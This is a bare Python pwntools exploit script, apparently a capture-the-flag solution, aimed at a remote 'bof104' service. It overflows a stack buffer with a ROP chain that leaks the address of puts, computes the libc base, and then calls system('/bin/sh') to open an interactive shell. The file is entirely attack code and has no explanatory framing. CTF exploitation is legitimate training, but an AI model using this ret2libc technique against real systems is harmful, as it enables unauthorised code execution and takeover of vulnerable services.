
from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('bof104')
# r= e.process()
r = remote('bof104.sstf.site', 1337)
# lib = e.libc
lib= ELF('libc.so.6')

main=0x00000000004011a7
puts_got = 0x404018
puts_plt = 0x401060
pop_rdi_ret= 0x0000000000401263
ret=0x000000000040101a
sysplt=0x4004e0


payload = b"".ljust(32, b"A")+b"b"*8
payload+= flat(pop_rdi_ret, puts_got, puts_plt, main)
pause()
r.sendline(payload)
r.recvline()

puts_libc = u64(r.recv(6).ljust(8,b"\x00")) 
log.info("puts_libc: %#x" %puts_libc)
base_libc = puts_libc - lib.sym.puts
system_libc = base_libc + lib.sym.system
binsh_libc = base_libc + next(lib.search(b"/bin/sh"))
log.info("base_libc: %#x" %base_libc)
log.info("system_libc: %#x" %system_libc)
log.info("binsh_libc: %#x" %binsh_libc)


payload = b"".ljust(32, b"A")+b"b"*8
payload+= flat(ret, pop_rdi_ret, binsh_libc, system_libc, main)
pause()
r.sendline(payload)

r.interactive()
